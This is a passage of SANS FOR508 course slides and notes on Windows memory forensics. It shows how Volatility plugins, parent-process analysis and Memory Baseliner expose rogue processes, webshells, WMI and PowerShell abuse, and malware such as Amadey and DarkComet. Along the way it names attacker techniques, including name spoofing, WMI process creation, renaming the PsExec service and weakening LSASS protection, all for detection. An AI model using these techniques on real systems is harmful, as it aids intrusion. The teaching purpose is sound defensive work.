FOR508 | Advanced Incident Response,Threat Hunting, and Digital Forensics

Knowing what’s normal on a Windows host helps cut through the noise to quickly locate potential malware. The
SANS “Hunt Evil” poster was designed specifically to address this need. We highly recommend you use it as a
reference, allowing you to focus your attention on the outliers. As an example, here we point out what would
normally be expected of a legitimate svchost.exe process.

.

svchost.exe
Image Path: %SystemRoot%\System32\svchost.exe
Parent Process: services.exe
Number of Instances: Five or more
User Account: Varies depending on svchost instance, though it typically will be Local System, Network Service,
or Local Service accounts. Instances running under any other account should be investigated.
Start Time: Typically, within seconds of boot time. However, services can be started after boot, which might
result in new instances of svchost.exe well after boot time.
Description: The generic host process for Windows Services. It is used for running service DLLs. Windows will
run multiple instances of svchost.exe, each using a unique “-k” parameter for grouping similar services. Typical
“-k” parameters include BTsvcs, DcomLaunch, RPCSS, LocalServiceNetworkRestricted, netsvcs, LocalService,
NetworkService, LocalServiceNoNetwork, secsvcs, and LocalServiceAndNoImpersonation. Malware authors
often take advantage of the ubiquitous nature of svchost.exe and use it either directly or indirectly to hide their
malware. They use it directly by installing the malware as a service in a legitimate instance of svchost.exe.
Alternatively, they use it indirectly by trying to blend in with legitimate instances of svchost.exe, either by
slightly misspelling the name (e.g., scvhost.exe) or spelling it correctly but placing it in a directory other than
System32. Keep in mind that a legitimate svchost.exe should always run from %SystemRoot%\System32,
should have services.exe as its parent, and should host at least one service. Also, on default installations of
Windows 7, all service executables and all service DLLs are signed by Microsoft.

© 2023 SANS Institute

.

37

Identify Rogue Processes: windows.psscan.PsScan (1)

Purpose
• Scan physical memory for EPROCESS pool allocatio ns

Important Parameters
• Show information for specific process IDs (--pid)
• Render output in sized columns (-r pretty)

Investigative Notes
• Scanning memory for process blocks, and not simpl y following
the EPROCESS linked list, can identify hidden processes
• psscan will also identify processes no longer running
• Thread and Handles counts can be reviewed for anomalies
(exited processes typically have no threads and handles)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

The windows.psscan.PsScan (psscan) plugin collects process data in a very different way than the
windows.pslist.PsList (pslist) plugin. Notice the word "scan" as part of its name. This is an
interesting distinction often seen in Volatility. Scanning plugins do not follow the normal set of procedures to
identify their objects, such as following the doubly linked list of all processes. Instead, they scan all of the
memory looking for markers of specific objects, similar to performing a data carve on a disk. Thus, they provide
an interesting counter-point to information provided with other plugins that can enhance our analysis. In the case
of psscan, it has the capability to identify terminated processes within the "unallocated" part of memory as
well as a better ability to find processes hiding due to kernel manipulations seen with rootkit techniques. The
scanning process causes this plugin to be significantly slower than its pslist analog, and returns similar info:
•
•
•
•
•
•
•
•
•
•

Process Identifier (PID)
Parent Process Identifier (PPID)
Process name (Image File Name)
Virtual offset of EPROCESS block (Offset(V))
Number of threads (Threads)
Number of handles (Handles)
Session identifier (SessionID)
64 or 32 bit code (Wow64)
Process start time (CreateTime)
Process stop time (ExitTime)

If you see the process ExitTime field populated, it indicates you are looking at a terminated process. ExitTime
can also be useful to identify how long a process was present, sometimes giving insight into the inner workings
of an executable. Sadly, not every terminated process is updated with an exit time, so also keep an eye out for
processes with zero threads and handles (no threads means no running code). Comparisons can also be made
with pslist output looking for items no longer present in the EPROCESS list. Note that it is not unusual to
see exited processes (with ExitTime timestamps) still present in the EPROCESS list. This is particularly
common in Windows 10+ where exited processes appear to be lingering on this list for much longer periods
before being removed.
Equivalent plugin in Volatility 2: psscan
38

© 2023 SANS Institute

.

38

Identify Rogue Processes: windows.psscan.PsScan (2)

psscan can find additional processes not found by pslist
(a.exe is an exited process)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

39

.

In this example, the windows.psscan.PsScan (psscan) plugin was run on a sample memory image, largely
showing most of the same processes windows.pslist.PsList (pslist) found. One exception was a
process named “a.exe” not present in the pslist output. This process was terminated, and removed from the
doubly linked list, but was still lingering in unallocated memory space. The existence of an exit time is a strong
indication it was not running at the time memory was captured. Notice it had zero threads (no code running) and
was a 32-bit process (Wow64 = True). Another way to test this conclusion would be to try to enumerate its process
objects like loaded DLLs and handles, which are typically unlinked (and hence missing) upon exit. We can also
document that “a.exe” executed for approximately 104 minutes by comparing the CreateTime and ExitTime values.
It might seem too obvious for malware to be running as a one-letter executable name, but it is quite common. It
could be due to any number of reasons, including attacker laziness, or other steps taken by the malware in an
attempt to remain invisible on the running system. But it is very difficult to hide in a memory image!
If you find a suspicious process in the psscan output, make note of the offset listed for that process. Many
Volatility plugins will allow you to specify a process by PID ("--pid") or by offset ("--virtaddr"). The latter might
work in some cases when the PID is unrecognized.
The psscan plugin does not sort results by process creation times as pslist does. This is because the list is
created as processes are found in memory. It is also possible to discover processes that have moved within
memory, showing up as duplicate processes (same name and PID) at different memory offsets.

© 2023 SANS Institute

.

39

.
40

© 2023 SANS Institute

.

Identify Rogue Processes: windows.pstree.PsTree (1)

Purpose
• Display the process list visually, in a tree structure

Important Parameters
• Render output in sized columns (-r pretty)
• Display mini-process tree for a single parent process (--pid)

Investigative Notes
• Very useful for visually identifying malicious proces ses spawned
by the wrong parent process (i.e., Explorer.exe as the parent of
svchost.exe)
• pstree relies upon the EPROCESS linked list and hence will
not show unlinked processes
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

41

.

Viewing parent-process relationships visually can be very helpful in identifying anomalies. The
windows.pstree.PsTree (pstree) plugin provides this capability within the Volatility framework. It
reads the EPROCESS doubly linked list in the kernel (similar to pslist) and outputs the results as a process
tree. This means it typically only has the capability to visualize active processes, unless any terminated
processes are still present in the EPROCESS linked list. The process information provided mirrors that of other
process plugins:
•
•
•
•
•
•
•
•
•
•

Process Identifier (PID)
Parent Process Identifier (PPID)
Process name (Image File Name)
Virtual offset of EPROCESS block (Offset(V))
Number of threads (Threads)
Number of handles (Handles)
Session identifier (SessionID)
64 or 32 bit code (Wow64)
Process start time (CreateTime)
Process stop time (ExitTime)

Equivalent plugin in Volatility 2: pstree

© 2023 SANS Institute

.

41

Identify Rogue Processes: windows.pstree.PsTree (2)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This example shows the process list from the same “hiding in plain sight” memory image previously analyzed.
However, the pstree plugin has now organized the process list into parent-child relationships. This visual
view of the data can be enormously helpful in picking out process list anomalies. Here we clearly see that one
of the “svchost” (or close enough) processes does not look like the others. “scvhost.exe” was spawned by
explorer.exe (the Windows desktop), not services.exe as we would expect.
Some output columns were removed from this output to fit on the slide.

42

© 2023 SANS Institute

.

42

.
© 2023 SANS Institute

.

43

Finding Webshells via Parent Process Analysis

IIS process w3wp.exe executing webshell commands

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

In this example, we are looking at memory taken from a web server. The system had a webshell installed that
was attributed to the Chinese nation-state group, Deep Panda (aka Shell Crew and APT19). A webshell is a
small script or piece of code placed on a web server, enabling the ability to execute remote commands on the
system. Webshells often take the form of rogue PHP or ASP pages (the latter was used in this example).
Infected web servers effectively become HTTP/HTTPS enabled backdoors. In this example, the standard
Microsoft IIS worker process (w3wp.exe) is rendering the webshell page and the attackers have connected to
the page and run a series of commands. Interestingly, the commands appear as child processes to the IIS
process, creating a very anomalous set of processes in the windows.pstree.PsTree output (normally
these executables would be children to a process like cmd.exe). Different webshells exhibit different process
patterns in memory, but this pattern would be a clear indication to the analyst to look further into this system.
An excellent introduction to web shells can be found in the following blog post.[1]
Some output columns were removed from this output to fit on the slide.
[1] Analyzing and Detecting Webshells: https://for508.com/nqrab

44

© 2023 SANS Institute

.

44

.
© 2023 SANS Institute

.

45

Orphan Processes (Amadey)

• It is unusual for a parent process to exit before its children
• Exceptions include System, explorer.exe, csrss.exe and wininit.exe

• Some loaders and advanced injection techniques create this
pattern, making it a useful detection mechanism

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

In both Windows and Unix, it is unusual to see child processes without corresponding parents. This type of
process is called an orphan process. It is unusual because child processes are designed to be spawned for the
performance of a task or some subset of work for a parent process. Thus, it is rare that a parent would exit
before its child processes are complete. As an example, the process dllhost.exe is commonly used as a surrogate
to run software extensions for a process and protect against failures (if the code crashes, dllhost crashes instead
of the parent process). Therefore, it would make no sense for dllhost.exe to be running without a corresponding
parent. Parent processes are generally expected to be present, and when they are not, it is a good place to look a
bit closer. Malware loaders can create this pattern as they get their intended payloads running and then exit.
We also see it during some code injection attacks where a process is specifically created to inject code into, with
the parent process no longer necessary once the injected code is executing. For example, many Metasploit
Meterpreter payloads exhibit this behavior. Hiroshi Suzuki and Hisao Nashiwa chose orphan processes as one
of their top hunting techniques in their excellent presentation, Super Easy Memory Forensics, FIRST
Conference, Dublin, June 2022.[1]
On this slide we see an initial Amadey infection.[2] Three separate bad processes are present in the process tree,
all of them being orphan processes (System PID 4 is also identified on the slide, but it is legitimate and
expected). The process named “Sun07610e6b216” would hopefully be strange enough to catch most analyst’s
eye, but “setup_install.exe” and “tkools.exe” might have been generic enough to escape initial notice. However,
the fact that they have no parents still running (a single “*” in pstree output indicates the start of a branch) is
a good reason to flag them for further review. In this case, all three turned out to be components of Amadey.
A few legitimate and well-known processes often appear “orphaned”, with no parent process running. System
(the mother of all processes), explorer.exe, csrss.exe, and wininit.exe are all well documented as processes with
no expected parents. Interestingly, if you look at explorer.exe in the example on this slide, it is situated under its
expected parent of userinit.exe, but notice that userinit.exe has an exit time and is in fact terminated. While the
convention is usually followed, Windows does not actively enforce parent/child relationships. This opens the
door to even more advanced attacks like parent process ID (PID) spoofing.
[1] Super Easy Memory Forensics Slides: https://for508.com/w74cl
[2] Malpedia – Amadey: https://for508.com/y8qg1

46

© 2023 SANS Institute

.

46

.
© 2023 SANS Institute

.

47

Persistence and Lateral Movement Processes

Service

Task Scheduler

Registry Run Key

PsExec*

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Windows is designed to run code as process threads. Knowing this, it should come as no surprise that
persistence and lateral movement techniques generate interesting processes on the victim system. As discussed
in a previous section, the majority of attacks seen in the wild leverage a relatively small number of these
techniques. Learning patterns for common persistence and lateral movement activity can greatly assist with
spotting evil within memory. The process trees for four common techniques are demonstrated on this slide, each
with an evil process running named “updater.exe.”
Services are one of the most common ways code is executed in Windows and hence you will see many child
processes under the “services.exe” process. When looking for malware it is almost always worth the time to
review this lengthy list. It is no coincidence that three out of the four techniques covered on this slide ultimately
fall under “services.exe.”
Similar to services, there can be hundreds of scheduled tasks present on modern Windows systems , providing a
lucrative opportunity for attackers to hide one bad task among the many. When triggered, a scheduled task runs
under a “svchost.exe” process responsible for executing tasks. This process can be picked out among the many
identically named processes by looking for a child process named “taskhostw.exe” and the process command
line of “C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule” (Win10+). Executables running as a
scheduled task will show up as a direct child under this “svchost.exe” process (not under “taskhostw.exe”).
Registry run keys are designed to run during user login, and therefore commonly run as child processes of the
user desktop process, “explorer.exe.” Most applications running under a user context will be child processes
here, making it an excellent location to find many kinds of attacks beyond those of registry run key persistence.
Remotely executed code by the PsExec tool runs as a service on the target system, and that service is named
“PSEXESVC.exe” by default. Executed binaries will manifest as child processes to this special service. While
default use of PsExec is common, keep in mind the “PSEXESVC.exe” service name can be changed using the
tool’s “-r” parameter. Also note that this pattern belongs to the SysInternals version of the tool, and not
necessarily those of the many other remote execution tools and payloads calling themselves “psexec.” In fact,
many of the most common copycat tools with this name, like Cobalt Strike’s psexec payloads, use WMI or
PowerShell to execute, with a very different parent/child process pattern as a result.
48

© 2023 SANS Institute

.

48

WMI and PowerShell Processes

WMI-based Attacks
wmiprvse.exe / scrcons.exe

PowerShell Remoting

WMI / WinRM

Children Processes
Provide Context

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

49

.

As WMI and PowerShell become ubiquitous in the enterprise, we should expect to see them in our process trees.
The process present tells us a lot about the type of activity occurring on the system. In the top-left example on
this slide, we can see a WMI-based attack with the primary WMI process, “WmiPrvSE.exe”, used to run
PowerShell code (“powershell.exe”). This pattern is the precursor in many attacks, including some Cobalt
Strike commands and in WMI CommandLine Event Consumers (note that some legitimate remote activity can
also create this interesting parent-child relationship, but it is almost always worth looking into). WMI Event
Consumers can be used for persistence and code execution, with two types of consumers actively abused in the
wild: CommandLine and ActiveScript consumers. While this slide shows an example of a
CommandLineEventConsumer attack, ActiveScriptEventConsumers are also commonly abused. Interestingly,
when ActiveScriptEventConsumers are executed, they spawn a process rarely seen on most systems,
“scrcons.exe.” [1] The official Microsoft name for “scrcons.exe” is WMI Standard Event Consumer - Scripting
Application, indicating a very narrow focus. If you ever see this process, it is worth digging into!
WMI was designed to be queried and controlled remotely, and the “WmiPrvSE.exe” process (WMI Provider
Host) is responsible for running WMI commands on a remote (target) system. WmiPrvSE facilitates the
interface between WMI and operating system. WMI is incredibly flexible, and attackers have identified many
ways to run malicious code using it (“wmic.exe process call create” is the classic example, but it can get much
more involved). You may even see attackers move to WMI when PowerShell remoting is available because it is
less obvious to have things running via WMI. The child processes of WmiPrvSE can often be the clue that
helps identify suspicious behavior.
If “wsmprovhost.exe” is identified on a system, it indicates PowerShell remoting activity. This process is
executed on the remote, or target system. This can include PowerShell capabilities like Enter-PSSession,
Invoke-Command, New-PSSession, or any number of PowerShell cmdlets that natively have the
“-ComputerName” parameter such as Set-Service, and Clear-EventLog. This presumes true PowerShell
remoting is in use. Older cmdlets like Get-WMIObject that use RPC DCOM for connections will typically be
taken care of by a svchost.exe process and you might find them via suspicious internal network connections.
“PowerShell.exe” itself is often interesting, showing local usage of the tool. A good rule of thumb is if a user

© 2023 SANS Institute

.

49

executes PowerShell, the parent process will be “explorer.exe”. If PowerShell is running with a parent of
“svchost.exe”, it is a good indication an admin account was used. PowerShell with a parent of “cmd.exe” is also
worth looking for – it is often indicative of launch via backdoors or command shells, but it also could just be a
user moving to PowerShell from a cmd.exe terminal. PowerShell with parents like “winword.exe”, “mshta.exe”,
or “wscript.exe” is definitely anomalous and worth investigating.
Finding malicious WMI and PowerShell in memory can be challenging due to the amount of legitimate activity
happening in the modern enterprise. As with all things in this field, context is important, and we can often get
more context by looking at the parent and children of processes. In the final example on this slide, we see
evidence of PowerShell remoting (“wsmprovhost.exe”) with interesting children processes, namely “sc.exe”.
The sc tool interacts with Windows Services, which are often attack targets. Those two pieces of information
should lead the analyst to want to perform a deeper inspection of that particular process tree, specifically
focused on services. Another example could be an application like Word or Outlook (or something more
obscure like “mshta.exe”) spawning a child PowerShell process. That would be an obvious anomaly possibly
indicating a macro or other malicious payload was executed.

.

[1] Red Canary Babysitting Child Processes: https://for508.com/ymlwi

50

© 2023 SANS Institute

.

Investigating WMI Processes (Impacket)
wmiprvse.exe is the parent process of WMI-based attacks and
CommandLineEventConsumers

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

51

Running processes on a system provide an excellent opportunity to discover suspicious WMI activity. This
information comes from structures only present in live memory, and thus access to memory and some means of
memory analysis is required. Process information can be analyzed through an EDR tool, live response
collection, or via analysis of offline memory dumps.

.

When looking at processes in memory, it is important to understand every process has (or once had) a parent. By
organizing via a process tree and analyzing these parent-child relationships, we can often derive anomalous
patterns. This turns out to be a reliable way to identify WMI event consumers and a wealth of other anomalous
WMI activity. The standard WMI process is “wmiprvse.exe”. A modern Windows system may have several of
these running, and their parents should be the process “svchost.exe” (as seen in the example on this slide). If you
were to see “wmiprvse.exe” running with a parent of something like W3WP (IIS webserver worker process), it
would be anomalous and could be an indication of webshell activity. In this example, it is the child process, not
the parent which is strange. Notice “wmiprvse.exe” has spawned a “cmd.exe” process, which is highly unusual.
This the exact pattern created when a WMI CommandLineEventConsumer executes (this type of attack is
documented in the persistence section of this class). In this case, this WMI-based attack appears to be modifying
the Windows registry value that implements protected processes (a new feature starting in Windows 8). It could
be that part of the attack is to downgrade the security of the LSASS process via this mechanism. The commandline information stored per process gives even greater context. The combination of wmiprvse.exe spawning a
command prompt doing something strange in the registry is exactly what an analyst should recognize to
alert them to a potential compromise.
This is a fun example because the strange command can be sourced to a specific attack tool. Command lines
associated with the popular Impacket wmiexec.py tool are memorable and can be easy indicators of compromise
to hunt for. CrowdStrike published an excellent post on hunting wmiexec if you would like to explore the topic
in more depth.[1]
[1] How to Detect and Prevent Impacket's Wmiexec: https://for508.com/0c98h

© 2023 SANS Institute

.

51

Data Reduction: Memory Baseliner

Purpose
• Stand-alone tool built on Volatility 3 to compare memory obj ects found in
suspect image to those present in a baseline (known good) image

Important Parameters
• Known good baseline image (-b)
• Suspect memory image (-i)
• Display all items including those found in baseline image (--showknown)
• Baseline processes and DLLs (-proc), drivers (-drv), or services (-svc)

Investigative Notes
• Saving the initial baseline in JSON greatly speeds subsequen t analysis
• Comparisons can be further tightened using import hash (--imphash),
owner (--owner), command line (--cmdline) or service state (--state)
• Stacking (least frequency of occurrence) analysis can be accomplished
across several suspect memory images simultaneously (e.g., --procstack)
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Baseline analysis is a critical technique useful across a multitude of artifacts commonly used in digital forensics
and incident response. In its simplest form, baseline analysis consists of comparing a suspect data set with a
“known good” data set to identify outliers. Memory Baseliner was written by Csaba Barta to introduce this
capability to memory analysis.[1] Windows memory can easily contain over one hundred processes each
pointing to hundreds of process objects in addition to hundreds of drivers and services. Even a seasoned pro will
often miss malware hiding amidst the thousands of items that must be reviewed. However, if the analyst has a
baseline from a clean system of a similar type, many of the "known good" items can be quickly filtered. To
accomplish this feat, Csaba created a capability to feed Volatility two memory images: your suspect image and a
baseline image to compare. The latest version of this tool, Memory Baseliner, was written as a stand-alone tool
using Volatility 3 as a library. It can baseline a single memory image or an entire collection of images via a
process called “stacking.”
Memory Baseliner can perform baseline comparisons for four types of objects in memory: processes and
associated DLLs (-proc), drivers (-drv), and Windows services (-svc). During baselining, two memory images
must be provided: a baseline image using the “-b” argument and the suspect image using the “-i” argument.
Output can be saved to a file (“-o” option) and can be subsequently analyzed in your favorite spreadsheet tool or
viewer. A good pro-tip is to use the --showknown option to output both known (in the baseline) and unknown
(not in the baseline) data into one large output file that can be filtered in many ways. When performing analysis,
take the time to peruse the various columns as there will be a lot of information available, including process
name, command line, parent process, loaded DLLs, import table hashes (when available),
KNOWN/UNKNOWN status (“KNOWN” indicates the item was present in your baseline), and even frequency
of occurrence information for each process (labeled “BASELINE Fo O” and “IMAGE Fo O” for the baseline
and suspect images respectively). The SANS DFIR blog post on this tool includes some excellent analysis
techniques to help leverage this wealth of information.[2]
Least frequency of occurrence analysis can also be accomplished by using the stacking options. The power of
stacking rests in the fact that malware artifacts are much rarer than those associated with normal system activity.
If one were to collect all the executables, drivers, DLLs, or services across many systems, the items associated
with malware should be among the least frequently occurring. A DLL existing on 73 systems is much less likely

52

© 2023 SANS Institute

.

52

to be malicious than a DLL existing on only one. Memory Baseliner facilitates stacking via the use of the “-d
<image folder>” option to point to a folder containing a collection of memory images to compare. Processes,
DLLs, drivers, and services can be stacked across these memory images (using options like
“-drvstack”), allowing the least frequently occurring items to bubble up to the top of the output for easier
identification. Like all analysis techniques, do not expect this to be the miracle technique accomplishing instant
malware identification. There are many unique snowflakes in an enterprise, even among systems of similar
builds (which is what you should be targeting with this technique). You will likely need to work through many
least frequently occurring false positives to find evil, but at a minimum this technique is adept at greatly
reducing the dataset and providing an alternate means to look for outliers.
The biggest hurdle of Memory Baseliner is it can take a long time to complete. The latest version has been
optimized, but it is not unusual for baseline output on a large memory image to require 15 minutes to generate.
This can be significantly sped up after the first attempt with the use of the --jsonbaseline feature. This feature
creates a JSON file for the “known good” memory image which can be loaded in the future to eliminate the time
necessary to re-analyze that memory image. The --savebaseline argument will create the JSON file allowing the
--loadbaseline argument to be subsequently used to take advantage of the baseline in the future. Both arguments
also require the --jsonbaseline argument referencing the name of the JSON file. When using this feature,
remember that JSON files are specific to the type of analysis being conducted, meaning you will need separate
JSON files for process, driver, and service analysis. Once created, you also no longer need to point to (or have)
the baseline memory image if a JSON file is being used. Since baseline JSON output is typically under 1MB,
this makes them much more portable than full memory images. You can imagine maintaining a repository of
baseline JSON files encompassing a wide range of different system types and operating system versions that you
are likely to encounter.
An earlier version of the tool was written as a set of Volatility version 2 plugins. This version is very different
and less capable than the current version. However, should you need to use the older version, the plugin
processbl compares processes and their loaded DLLs (using data objects similar to pslist and
ldrmodules). Similarly, servicebl compares services using the svcscan components, and driverbl
compares loaded drivers with modscan functionality.[3]

.

[1] Memory Baseliner on Github: https://github.com/csababarta/memory-baseliner
[2] Power Up Memory Forensics with Memory Baseliner:
[3] Volatility 2 Baseline Plugins: http://for508.com/6elpx

© 2023 SANS Institute

.

53

Data Reduction: Memory Baseliner(DarkComet)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Here we see an example of Memory Baseliner in action. The memory image analyzed was infected with
DarkComet, a well-known remote access tool most recently used by several hacktivist groups based out of the
Middle East. A windows.pslist.PsList view of the infected memory image showed 43 running
processes. In the output displayed on the slide, we can see the use of a baseline image reduced the number of
processes to review down to 13 processes not present in the baseline (indicated by the UNKNOWN labels in
front of each process).
Several processes immediately look interesting, including two cmd.exe processes, runddl32.exe, notepad.exe,
and DumpIt.exe (the latter is the name of a well-known memory dumping tool that was likely used to create the
memory image). The extra command line information provides further context and runddl32.exe sticks out due
to it being run from an unusual location (a user profile “Temp” folder). Those of you with experience might also
have immediately noticed there is something wrong with the executable name. There is no legitimate
runddl32.exe file in Windows. The real executable is named rundll32.exe. By reducing the noise that the analyst
must interpret, anomalies like this have a better chance to become obvious. Also notice notepad.exe has
runddl32.exe as a parent making it likely to also be malicious. The command lines associated with the cmd.exe
processes appear to show attacker tradecraft of changing folder and file attributes to be marked as hidden system
objects. There is a lot of important information packed into a small space here! In the full output you would see
much more information including loaded DLLs for each process, frequency of occurrence information, and
import hashes useful for more detailed comparisons. This can be a lot of information so initially limit your data
to just a list of process names (as seen in this example), filter for “.exe” in the DLL NAME column. This works
because the image binary (.exe) will also be present in the loaded DLL list. Combine this with PROCESS
STATUS=UNKNOWN to quickly identify processes not present in the original baseline image.
Note that the baseline image used in this example was very different than the system DarkComet was run on. A
tailored baseline image to a specific workstation/server build would yield even fewer “unknown” processes to
review.
Thanks to @TekDefense for making available the excellent sample memory image: http://for508.com/twmsu.

54

© 2023 SANS Institute

.

54

.ir
01
de
hi
© 2023 SANS Institute

.

55

Identify Rogue Processes Review
• All identified processes should be sanity checked for:
• Correct image/executable name
• Correct file location (path)
• Correct parent process
• Correct command line and parameters used
• Start time information

• Volatility provides multiple ways to review processes:
• windows.pslist gives a high-level view of what is in the EPROCESS linked list
• windows. psscan gives a low-level view, searching for unlinked process blocks
• windows. pstree visually shows parent-process relationships
• Memory Baseliner allows comparisons with a known good baseline

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

No one becomes an expert in memory forensics on their first day. Through experience, you will learn to
quickly identify anomalies in processes related to:
Correct image/executable name
Correct file location (path)
Correct parent process
Correct command line and parameters used
Start time information

.

•
•
•
•
•

Reviewing running processes is one of the most basic activities accomplished during memory analysis. By
reviewing the attributes of each process, you might be able to identify anomalies that lead you to suspect
certain processes. Over the next several sections, we will learn how to use Volatility to gather additional
information about a process in order to confirm or dispel our suspicions.
We covered three different mechanisms within Volatility to gather and present process information. Pslist
is fast and simple but might miss hidden processes. Psscan doesn’t trust the standard kernel mechanisms for
tracking processes and instead scans the entire memory image, giving it the ability to find hidden and
terminated processes. Finally, pstree displays information visually, showing the parent-process
relationships for each process. We also saw how specialized tools like Memory Baseliner can perform data
reduction, quickly pointing an analyst to anomalies.

56

© 2023 SANS Institute

.

56

Lab 3.1
Identify Rogue Processes
Average Time: 25 Minutes

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

57

.

This page intentionally left blank.

© 2023 SANS Institute

.

57

Step 2:
Analyze Process Objects

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

58

© 2023 SANS Institute

.

58

Analyze Process Objects

Windows processes are composed of
much more than just an executable
DLLs

Dynamic Linked Libraries (shared code)

Handles

Pointer to a resource

Files

Open files or I/O devices

Directories

Lists of names used for access to kernel objects

Registry

Access to a key within the Windows Registry

Mutexes/Semaphores

Control/limit access to an object

Events

Notifications that help threads communicate and organize

Threads

Smallest unit of execution; the workhorse of a process

Memory Sections

Shared memory areas used by a process

Sockets

Network port and connection information within a process
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

59

There is a whole lot more to processes than just image names and parent processes. To identify some harder-to-find
malware, we are going to have to dig deeper. Processes can have hundreds of associated objects.[1] In fact, the perprocess limit on kernel handles is 2^24, so there can be a vast number of objects to review! Identifying a suspicious
process object can help inform how much we trust a given process. The following objects can be reviewed:

•

•
•
•

DLLs: Dynamically Linked Libraries define the capabilities of a process. For instance, if a process needs to
communicate via HTTP, it will load the “wininet.dll” file. In some cases, malware will load its own malicious
DLLs to take control of a process.
Handles: A pointer to a resource, handles exist in many different forms. Some of the most important to memory
analysis are:
• File handles: Identify which items in the file system or which I/O devices are being accessed by the process.
• Directory handles: This is not your standard file system directory. Instead, directory handles are known lists
within the kernel that allow the process to find kernel objects. Common examples are KnownDlls,
BaseNamedObjects, Callbacks, Device, and Drivers.
• Registry handles: These are the registry keys the process is reading or writing to.
• Mutex or semaphore handles: Also called "mutants", these objects control or limit access to a resource. For
instance, a mutex might be used by an object to enforce that only one process at a time can access it. Worms
commonly set mutexes as a way of "marking" a compromised system so that it does not get reinfected.
• Event handles: Events are a way for process threads to communicate. Malware will occasionally use unique
event handles.
Threads: A process is just a container for all of the items that do the real work. Multiple threads run within every
process interacting with various system objects.
Memory sections: Every process has a collection of virtual memory pages where DLLs and files are loaded, and
code and data are stored. The Virtual Address Descriptor tree (VAD) maintains a list of these assigned memory
sections.
Sockets: These are network connection endpoints. Every network socket is assigned to a specific process,
allowing us to trace back suspicious network activities.

.

•

[1] Object Manager: http://for508.com/50y62

© 2023 SANS Institute

.

59

Analyze Process Objects Plugins with Volatility
windows.dlllist

Print list of loaded DLLs for each process

windows.cmdline

Display command line args for each process

windows.getsids

Extract the ownership SIDs for each process

windows.handles

Print list of open handles for each process

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Upon reaching the "Analyze Process Objects" step, we have likely identified some suspicious processes.
Although we might have a feeling that a process is bad, there is much, much more for us to base our decision on
than image name, parent process, and start time. When analyzing process objects, we are delving deep into each
process to identify and assess their component parts. Volatility has a wealth of plugins allowing us to do this,
and we have chosen the most useful for this purpose. The windows.dlllist plugin provides loaded DLLs.
In Volality version 2 it also provided command line information, but this information is now provided in a
dedicated plugin, windows.cmdline. Windows.getsids shows the security identifiers belonging to
each process and windows.handles outputs information on the many different handles a process can own.

60

© 2023 SANS Institute

.

60

Analyze Process Objects: windows.dlllist.DllList

Purpose
• Display and dump loaded DLLs for each process

Important Parameters
• Show information only for specific process IDs (--pi d)
• Extract DLLs from the memory image (--dump)

Investigative Notes

• There can be hundreds of loaded DLLs! Limit outp ut with --pid
• LoadTime can help detect DLLs injected after initial load time
• Dump errors can indicate the DLL is paged. Provide a page file to
Volatility and/or attempt to locate DLL loaded in other processes
• The windows.dumpfiles plugin is also a good alternative
• Use windows.ldrmodules for 32-bit WoW64 processes
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

61

.

Windows processes rely extensively on loaded libraries to accomplish their functions. Knowing what libraries
were loaded can give insight into what the process was doing. It is also an excellent way to detect maliciously
loaded DLLs. The Process Environment Block (PEB) for each process tracks loaded DLLs. Interestingly, the
EPROCESS block allows only 14 bytes for an image name, so to get the full name, you must look in the PEB
where it is stored along with the command line (plus parameters) used to start the process
(windows.cmdline is used to extract command lines from the PEB). Thus, if it looks like a name was cutoff in your process listing, this is the plugin to look at next.
There are two important options associated with windows.dlllist. The total DLLs loaded for every
process number in the hundreds, so a better strategy is to review them for a smaller set of processes you might
be unsure about or for which you desire more information. The “--pid” argument limits data to list of processes
by PID. In Volatility 3, multiple PIDs should be separated by a space (a comma was used in Volatility 2). The “-dump” option is used to extract DLLs for individual analysis or activities like anti-virus scans. It can be
combined with “--pid” to limit the output. Paging often affects the ability to extract DLLs, resulting in the
process space being unavailable or even parts of the DLL (like the header) missing. There are multiple options
to deal with errors encountered while dumping DLLs. The Volatility 3 option “--single-swap-locations” can
take a “pagefile.sys” paging file as input. However, testing indicates this feature needs improvement and may
be more viable in future versions. The same DLL can be loaded into many processes, so there is often a good
chance of extracting it from those alternate PIDs. If that fails, the very powerful windows.dumpfiles
plugin has the potential to extract copies of cached files from memory (this plugin will be discussed later). The
plugin provides the following information for each loaded DLL:
•
•
•
•

Base address (Base)
DLL Size (Size)
File (Name) and (Path)
When the DLL was loaded (LoadTime)

The base address provided is the memory location within the process address space and is not a virtual or
physical address. Plugins like the Volatility 2 dlldump plugin can take advantage of this value. The
LoadTime column reveals when the DLL was loaded into the process. This could be valuable to identify DLLs
added to a process after runtime (not necessarily an indication of evil, but it could help detect some code
© 2023 SANS Institute

.

61

injection vectors). This plugin reports only information found within the PEB. Thus, it is not successful at
identifying attacks like reflective DLL injection, which circumvent updating the PEB lists. Other plugins,
including windows.ldrmodules and windows.malfind provide additional information about loaded
DLLs, helping to identify more advanced attacks. We will cover both of these plugins later in the course.
Don’t neglect to take a critical eye to what DLLs are loaded by a process. While reverse engineers are usually
more versed in normal DLL imports, if you see a calc.exe process loading HTTP libraries like winhttp.dll and
wininet.dll, that is probably suspicious. A final limitation of this plugin arises in 32-bit (WoW64) processes.
The PEB does not track all available loaded DLLs for these older architecture processes, and you will largely
see the WoW64 compatibility DLLs instead. For these processes you can used the more robust
windows.ldrmodules plugin which has multiple means to identify loaded code in a process and hence can
provide a more complete set of data for 32-bit processes.

.

Equivalent plugin in Volatility 2: dlllist

62

© 2023 SANS Institute

.

Analyze Process Objects: windows.cmdline.CmdLine

Purpose
